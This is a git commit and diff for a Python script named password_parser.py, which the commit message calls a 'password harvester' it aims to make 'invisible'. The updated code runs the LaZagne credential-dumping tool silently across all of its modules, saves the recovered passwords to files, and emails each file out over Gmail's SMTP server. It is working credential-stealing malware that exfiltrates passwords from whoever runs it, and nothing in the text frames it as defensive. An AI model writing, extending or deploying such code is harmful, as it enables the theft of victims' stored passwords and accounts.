52146db4c09d026d452f31be71ed6003b199c36b
urb.rob <urb.rob@o2.pl>
2019-01-06 02:45:03 +0100

    Make password harvester invicible

--- Python/Hacking/password_parser.py
+++ Python/Hacking/password_parser.py
@@ -2,6 +2,10 @@ import subprocess
 import smtplib
 import re
 import sys
+import os
+import shutil
+
+CREDENTIALS_DIR = 'credentials'
 
 def send_mail(email, password, message):
 	server = smtplib.SMTP('smtp.gmail.com', 587)
@@ -10,6 +14,11 @@ def send_mail(email, password, message):
 	server.sendmail(email, email, message)
 	server.quit()
 
-command = f'{sys._MEIPASS}\\laZagne\\laZagne.exe browsers'
-message = subprocess.check_output(command, shell=True)
-send_mail('', '', message)
+os.chdir(sys._MEIPASS)
+os.makedirs(CREDENTIALS_DIR)
+command = f'laZagne\\laZagne.exe all -quiet -oN -output {CREDENTIALS_DIR}'
+subprocess.call(command, shell=True)
+for credential in os.listdir(CREDENTIALS_DIR):
+	with open(f'{CREDENTIALS_DIR}\\{credential}', 'r') as myfile:
+		message = myfile.read()
+		send_mail('', '', message) # Pass your credentials here
